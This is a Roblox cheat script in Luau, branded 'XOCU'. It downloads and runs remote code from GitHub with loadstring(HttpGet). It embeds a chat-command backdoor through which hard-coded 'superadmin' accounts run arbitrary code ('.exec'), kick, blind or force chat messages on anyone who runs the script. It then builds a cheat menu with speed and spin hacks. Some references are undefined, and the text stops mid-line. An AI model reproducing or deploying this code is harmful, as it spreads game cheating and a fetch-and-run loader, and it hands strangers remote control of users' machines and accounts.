-- XOCU
game.Players.LocalPlayer.PlayerScripts.CharacterAndBeamMove.Enabled = false
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/iavichbest/XOCU/refs/heads/main/idk"))()

Players = game:GetService('Players')
TweenService = game:GetService('TweenService')
plr = Players.LocalPlayer
gui = plr:WaitForChild('PlayerGui'):WaitForChild('MenuGui')
TopRight = gui:WaitForChild('TopRight')
CoinsFrame = TopRight:WaitForChild('CoinsFrame')
CoinsDisplay = CoinsFrame:WaitForChild('CoinsDisplay')
CoinImage = CoinsDisplay:WaitForChild('CoinImage')
Coins = CoinsDisplay:WaitForChild('Coins')
CoinsButton = CoinsFrame:WaitForChild('CoinsButton')

for _, v in ipairs(CoinsFrame:GetChildren())do
    if v:IsA('UICorner') or v:IsA('UIStroke') or v:IsA('UIPadding') or v:IsA('UIGradient') then
        v:Destroy()
    end
end
for _, v in ipairs(CoinsDisplay:GetChildren())do
    if v:IsA('UIListLayout') then
        v:Destroy()
    end
end

blur = Instance.new('ImageLabel')
blur.Name = 'GlassBlur'
blur.BackgroundTransparency = 1
blur.Size = UDim2.new(1, 0, 1, 0)
blur.Position = UDim2.new(0, 0, 0, 0)
blur.Image = 'rbxassetid://8992230677'
blur.ImageTransparency = 0.88
blur.ScaleType = Enum.ScaleType.Stretch
blur.ZIndex = CoinsFrame.ZIndex - 1
blur.Parent = CoinsFrame
CoinsFrame.BackgroundColor3 = Color3.fromRGB(12, 14, 18)
CoinsFrame.BackgroundTransparency = 0.35
CoinsFrame.AutomaticSize = Enum.AutomaticSize.X
CoinsFrame.Size = UDim2.new(0, 0, 0, 74)
corner = Instance.new('UICorner')
corner.CornerRadius = UDim.new(1, 0)
corner.Parent = CoinsFrame
padding = Instance.new('UIPadding')
padding.PaddingLeft = UDim.new(0, 10)
padding.PaddingRight = UDim.new(0, 10)
padding.Parent = CoinsFrame
stroke = Instance.new('UIStroke')
stroke.Thickness = 1
stroke.Transparency = 0.6
stroke.Color = Color3.fromRGB(135, 206, 235)
stroke.Parent = CoinsFrame
borderGrad = Instance.new('UIGradient')
borderGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(135, 206, 235)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(135, 206, 235)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(135, 206, 235)),
})
borderGrad.Parent = stroke

task.spawn(function()
    while CoinsFrame.Parent do
        for i = 0, 360, 1 do
            borderGrad.Rotation = i

            task.wait(0.02)
        end
    end
end)
TweenService:Create(CoinsFrame, TweenInfo.new(2.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {BackgroundTransparency = 0.25}):Play()

CoinsDisplay.BackgroundTransparency = 1
CoinsDisplay.AutomaticSize = Enum.AutomaticSize.X
CoinsDisplay.Size = UDim2.new(0, 0, 1, 0)

local layout = Instance.new('UIListLayout')

layout.FillDirection = Enum.FillDirection.Horizontal
layout.VerticalAlignment = Enum.VerticalAlignment.Center
layout.HorizontalAlignment = Enum.HorizontalAlignment.Left
layout.Padding = UDim.new(0, 6)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = CoinsDisplay
Coins.LayoutOrder = 1
Coins.BackgroundTransparency = 1
Coins.AutomaticSize = Enum.AutomaticSize.X
Coins.TextXAlignment = Enum.TextXAlignment.Left
Coins.TextYAlignment = Enum.TextYAlignment.Center
Coins.Font = Enum.Font.GothamBold
Coins.TextSize = 34
Coins.Text = tostring(Coins.Text)

local textGrad = Instance.new('UIGradient')

textGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(135, 206, 235)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(135, 206, 235)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(135, 206, 235)),
})
textGrad.Parent = Coins

task.spawn(function()
    while Coins.Parent do
        for i = 0, 360, 2 do
            textGrad.Rotation = i

            task.wait(0.03)
        end
    end
end)

CoinImage.LayoutOrder = 2
CoinImage.BackgroundTransparency = 1
CoinImage.Size = UDim2.new(0, 64, 0, 64)
CoinImage.ImageColor3 = Color3.fromRGB(135, 206, 235)
CoinImage.AnchorPoint = Vector2.new(0, 0.5)
CoinImage.Position = UDim2.new(0, 0, 0.5, 0)

task.defer(function()
    CoinImage.Image = 'rbxassetid://6031094678'
end)
TweenService:Create(CoinImage, TweenInfo.new(2.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
    Position = CoinImage.Position + UDim2.new(0, 0, 0, -4),
}):Play()

CoinsButton.BackgroundTransparency = 1
CoinsButton.Text = ''
CoinsButton.Size = UDim2.new(1, 0, 1, 0)
CoinsButton.ZIndex = CoinsFrame.ZIndex + 5

function tween(obj, ti, props)
    TweenService:Create(obj, ti, props):Play()
end

CoinsButton.MouseEnter:Connect(function()
    tween(stroke, TweenInfo.new(0.2), {Transparency = 0.15})
    tween(CoinImage, TweenInfo.new(0.2), {
        ImageColor3 = Color3.fromRGB(135, 206, 235),
    })
end)
CoinsButton.MouseLeave:Connect(function()
    tween(stroke, TweenInfo.new(0.2), {Transparency = 0.6})
    tween(CoinImage, TweenInfo.new(0.2), {
        ImageColor3 = Color3.fromRGB(135, 206, 235),
    })
end)
CoinsButton.MouseButton1Down:Connect(function()
    tween(CoinsFrame, TweenInfo.new(0.08), {
        Size = UDim2.new(0, 0, 0, 71),
    })
end)
CoinsButton.MouseButton1Up:Connect(function()
    tween(CoinsFrame, TweenInfo.new(0.2, Enum.EasingStyle.Back), {
        Size = UDim2.new(0, 0, 0, 74),
    })
end)

Players = game:GetService('Players')
RunService = game:GetService('RunService')
TextChatService = game:GetService('TextChatService')
LocalPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal('LocalPlayer'):Wait()
RBXGeneral = TextChatService.TextChannels:FindFirstChild('RBXGeneral')
scriptedPlayers = {}
scriptedPlayers[LocalPlayer] = true

local superAdmins = {
    kshopnakub_2271 = true,
    MNHET_XOCU = true,
    gpoikhfgy = true,
}
local admins = {}
local tempAdmins = {}

function sendLines(player, lines, perMessage)
    perMessage = perMessage or 4

    for i = 1, #lines, perMessage do
        local chunk = {}

        for j = i, math.min(i + perMessage - 1, #lines)do
            table.insert(chunk, lines[j])
        end

        local text = table.concat(chunk, '\n')

        game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, 'All')
        task.wait(0.25)
    end
end

local commandHelp = {
    '.chat (Target) (Text)',
    '.bring (Target)',
    '.kill (Target)',
    '.kick (Target)',
    '.freeze (Target)',
    '.thaw (Target)',
    '.spin (Target)',
    '.unspin',
    '.fps (Target) (Cap)',
    '.friend (Target)',
    '.unfriend (Target)',
    '.admin (Target)',
    '.revoke (Target)',
    '.exec (Target) (Code)',
    '.reveal (Target) (All)',
    '.credits',
    '.blind (Target)',
    '.cmds',
}
local frozenPlayers = {}

function getRole(name)
    if superAdmins[name] then
        return 'superadmin'
    elseif admins[name] or tempAdmins[name] then
        return 'admin'
    else
        return 'user'
    end
end
function resolveTargets(input)
    if not input then
        return {}
    end

    input = input:lower()

    local results = {}

    if input == 'all' then
        for player in pairs(scriptedPlayers)do
            table.insert(results, player)
        end

        return results
    end

    for _, plr in ipairs(Players:GetPlayers())do
        local uname = plr.Name:lower()
        local dname = (plr.DisplayName or ''):lower()

        if uname:sub(1, #input) == input or dname:sub(1, #input) == input then
            table.insert(results, plr)
        end
    end

    return results
end
function toggleBlock(player, enable)
    local char = player.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if not hrp then
        return
    end
    if enable then
        if not hrp:FindFirstChild('Block') then
            local bv = Instance.new('BodyVelocity')

            bv.Name = 'Block'
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.zero
            bv.Parent = hrp
        end
    else
        local bv = hrp:FindFirstChild('Block')

        if bv then
            bv:Destroy()
        end
    end
end
function freezePlayer(player, enable)
    if not scriptedPlayers[player] then
        return
    end

    local char = player.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if hrp then
        hrp.Anchored = enable
    end
end

local spin = false
local spinTarget = nil

function sendToChat(msg)
    if RBXGeneral and msg then
        pcall(function()
            RBXGeneral:SendAsync(msg)
        end)
    end
end
function handleMessage(sender, text)
    local senderRole = getRole(sender.Name)

    if senderRole == 'user' then
        return
    end

    local args = {}

    for word in text:gmatch('%S+')do
        table.insert(args, word)
    end

    if #args < 1 then
        return
    end

    local cmd = args[1]:lower()
    local targets = resolveTargets(args[2])

    if cmd == '.chat' then
        local msg = table.concat(args, ' ', 3)

        if msg ~= '' then
            for _, target in ipairs(targets)do
                if target == LocalPlayer then
                    sendToChat(msg)
                end
            end
        end
    elseif cmd == '.kick' then
        local reason = table.concat(args, ' ', 3)

        if reason == '' then
            reason = 'No Reason was applied.'
        end

        for _, target in ipairs(targets)do
            local message = 'Kicked by: ' .. sender.DisplayName .. ' (@' .. sender.Name .. ')\n' .. 'Reason: ' .. reason

            target:Kick(message)
        end
    elseif cmd == '.wither' then
        witheringheights()
    elseif cmd == '.kill' then
        for _, target in ipairs(targets)do
            local hum = target.Character and target.Character:FindFirstChildOfClass('Humanoid')

            if hum then
                hum.Health = 0
            end
        end
    elseif cmd == '.bring' then
        for _, target in ipairs(targets)do
            local hrp = target.Character and target.Character:FindFirstChild('HumanoidRootPart')
            local senderHRP = sender.Character and sender.Character:FindFirstChild('HumanoidRootPart')

            if hrp and senderHRP then
                hrp.CFrame = senderHRP.CFrame + Vector3.new(0, 0, -3)

                toggleBlock(target, true)
                task.delay(1, function()
                    toggleBlock(target, false)
                end)
            end
        end
    elseif cmd == '.spin' then
        spin = true
        spinTarget = targets[1]
    elseif cmd == '.unspin' then
        spin = false
        spinTarget = nil
    elseif cmd == '.fps' then
        local cap = tonumber(args[3])

        if cap and setfpscap then
            setfpscap(cap)
        end
    elseif cmd == '.fling' then
        for _, target in ipairs(targets)do
            local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
            local tHRP = target.Character and target.Character:FindFirstChild('HumanoidRootPart')

            if myHRP and tHRP then
                myHRP.CFrame = tHRP.CFrame

                task.wait()

                myHRP.Velocity = Vector3.new(9999, 9999, 9999)
            end
        end
    elseif cmd == '.freeze' then
        for _, target in ipairs(targets)do
            frozenPlayers[target] = true

            freezePlayer(target, true)
        end
    elseif cmd == '.thaw' then
        for _, target in ipairs(targets)do
            frozenPlayers[target] = nil

            freezePlayer(target, false)
        end
    elseif cmd == '.friend' then
        for _, target in ipairs(targets)do
            if target ~= LocalPlayer then
                pcall(function()
                    LocalPlayer:RequestFriendship(target)
                    sendToChat('friended ' .. target.Name)
                end)
            end
        end
    elseif cmd == '.unfriend' then
        for _, target in ipairs(targets)do
            if LocalPlayer:IsFriendsWith(target.UserId) then
                pcall(function()
                    LocalPlayer:RevokeFriendship(target)
                    sendToChat('unfriended ' .. target.Name)
                end)
            end
        end
    elseif cmd == '.admin' then
        if senderRole ~= 'superadmin' then
            return
        end

        for _, target in ipairs(targets)do
            if target and not superAdmins[target.Name] then
                tempAdmins[target.Name] = true

                sendToChat(target.DisplayName .. ' (@' .. target.Name .. ') is now whitelisted')
            end
        end
    elseif cmd == '.revoke' then
        if senderRole ~= 'superadmin' then
            return
        end

        for _, target in ipairs(targets)do
            if tempAdmins[target.Name] then
                tempAdmins[target.Name] = nil

                sendToChat(target.DisplayName .. ' (@' .. target.Name .. ') is no longer whitelisted')
            end
        end
    elseif cmd == '.exec' then
        if senderRole ~= 'superadmin' then
            return
        end

        local code = table.concat(args, ' ', 3)

        if code ~= '' and targets[1] == LocalPlayer then
            local fn, err = loadstring(code)

            if fn then
                pcall(fn)
            else
                warn(err)
            end
        end
    elseif cmd == '.cmds' then
        local chunkSize = 4

        for i = 1, #commandHelp, chunkSize do
            local chunk = {}

            for j = i, math.min(i + chunkSize - 1, #commandHelp)do
                table.insert(chunk, commandHelp[j])
            end

            sendToChat(table.concat(chunk, '\n'))
            task.wait(0.25)
        end
    elseif cmd == '.reveal' then
        for _, target in ipairs(targets)do
            if target == LocalPlayer then
                sendToChat('XOCU TUFF')
            end
        end
    elseif cmd == '.blind' then
        for _, target in ipairs(targets)do
            if target == LocalPlayer then
                local gui = Instance.new('ScreenGui', game.CoreGui)
                local frame = Instance.new('Frame', gui)

                frame.Size = UDim2.new(1, 0, 1, 0)
                frame.BackgroundColor3 = Color3.new(0, 0, 0)

                task.delay(5, function()
                    gui:Destroy()
                end)
            end
        end
    elseif cmd == '.credits' then
        for _, target in ipairs(targets)do
            if target == LocalPlayer then
                sendToChat('CREDITS: Made by XOCU and 9rr')
            end
        end
    end
end
function connectPlayer(player)
    player.Chatted:Connect(function(msg)
        handleMessage(player, msg)
    end)
end

for _, player in ipairs(Players:GetPlayers())do
    connectPlayer(player)
end

Players.PlayerAdded:Connect(connectPlayer)
RunService.Heartbeat:Connect(function()
    if not spin or not spinTarget then
        return
    end

    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
    local targetHRP = spinTarget.Character and spinTarget.Character:FindFirstChild('HumanoidRootPart')

    if hrp and targetHRP then
        local a = tick() * 2

        hrp.CFrame = targetHRP.CFrame * CFrame.new(math.cos(a) * 8, 2, math.sin(a) * 8)
    end
end)

-- Global state storage
local ToggleStates = {}
function SetToggleState(flag, value) ToggleStates[flag] = value end
function GetToggleState(flag) return ToggleStates[flag] or false end

local Options = Library.Items or Library.Flags or {}
local Toggles = Library.Flags or Library.Items or {}
local Window = Library:CreateWindow({
	Title = "XOCU",
    Theme = {
        Font = "SciFi",
        ImageTransparency = 5,
        BGTransparency = 100,
        BackgroundID = "131726780467000",
        Main = Color3.fromRGB(8, 10, 15),
        Second = Color3.fromRGB(1, 7, 32),
        ElementAccent = Color3.fromRGB(69, 28, 28),
        TextColor = Color3.fromRGB(124, 122, 255),
        GradientStart = Color3.fromRGB(86, 120, 249),
        GradientEnd = Color3.fromRGB(0, 255, 0),
        CornerRadius = 12,
        HudTransparency = 25
    },
	ToggleKey = Enum.KeyCode.RightShift,
	Transparency = 0.25,
	ShowWatermark = {Enabled = true, Title = true, User = true, FPS = true, Duration = false, Ping = true},
	AutoSave = true,
	ConfigFolder = "XOCU_Config",
    UiScale = 1.0,
    CustomIcon = "82269833034303"
})
local Tabs = {
    Main = Window:CreateTab("Main", true, "6023426915"),
	Defense = Window:CreateTab("Defense", true, "96097489556461"),
	Target = Window:CreateTab("Target", true, "10360632826"),
	Grab = Window:CreateTab("Grab", true, "17313314020"), 
	Player = Window:CreateTab("Player", true, "2795572803"),
    Server = Window:CreateTab("Server", true, "6023426925"),
    Toy = Window:CreateTab("Toys", true, "9682067800"),
	Misc = Window:CreateTab("Misc", true, "114167292947807"), 
    Figure = Window:CreateTab("Figure", true, "10826661578"),
	Keybinds = Window:CreateTab("Keybinds", true, "11710306257"), 
	Visuals  = Window:CreateTab("Visuals",  true, "112488114197106"),
}
local MainV = Tabs.Main:CreateBlock({Name = "Value", true, Side = "Left"})
local MainL = Tabs.Main:CreateBlock({Name = "Main", true, Side = "Left"})
local MainR = Tabs.Main:CreateBlock({Name = "Others", true, Side = "Right"})
local SoundGroup = Tabs.Main:CreateBlock({Name = "Others", true, Side = "Right"})


local spinningConnection = nil
local spinSpeed = 5

local PL_SpeedEnabled = false
local PL_SpeedValue = 16
local PL_SpeedConn = nil

local jpEnabled = false
local jpValue = 50
local jpConn = nil

local infJumpEnabled = false
local noclipEnabled = false
local noclipConnection = nil

MainL:CreateToggle({
    Name = "Spin Character",
    Flag = "Spin Character",
    Default = false,
    Callback = function(Value)
        SetToggleState("Spin Character", Value)
        if Value then
            spinningConnection = R.Heartbeat:Connect(function()
                local character = Player.Character
                local root = character and character:FindFirstChild("HumanoidRootPart")
                if root then
                    root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
                end
            end)
        else
            if spinningConnection then
                spinningConnection:Disconnect()
                spinningConnection = nil
            end
        end
    end
})

MainV:CreateSlider({
    Name = "Spin Speed",
    Flag = "Spin Speed",
    Default = 5,
    Min = 1,
    Max = 50,
    Callback = function(Value)
        spinSpeed = Value
    end
})

MainL:CreateToggle({
    Name = "Walkspeed",
    Flag = "Walkspeed",
    Default = false,
    Callback = function(Value)
        SetToggleState("Walkspeed", Value)
        PL_SpeedEnabled = Value
        if Value then
            if PL_SpeedConn then PL_SpeedConn:Disconnect() end
            PL_SpeedConn = RunService.RenderStepped:Connect(function()
                if not PL_SpeedEnabled then return end
                local char = LocalPlayer.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                local hum = char and char:FindFirstChild("Humanoid")
                if hrp and hum then
                    hrp.CFrame = hrp.CFrame + hum.MoveDirection * (PL_SpeedValue * 0.1)
                end
            end)
        else
            if PL_SpeedConn then
                PL_SpeedConn:Disconnect()
                PL_SpeedConn = nil
            end
        end
    end
})

MainV:CreateSlider({
    Name = "Walk Speed",
    Flag = "Walk Speed",
    Default = 16,
    Min = 1,
    Max = 1000,
    Callback = function(Value)
        PL_SpeedValue = Value
    end
})

MainL:CreateToggle({
    Name = "Jump Power",
    Flag = "Jump Power",
    Default = false,
    Callback = function(Value)
        SetToggleSta
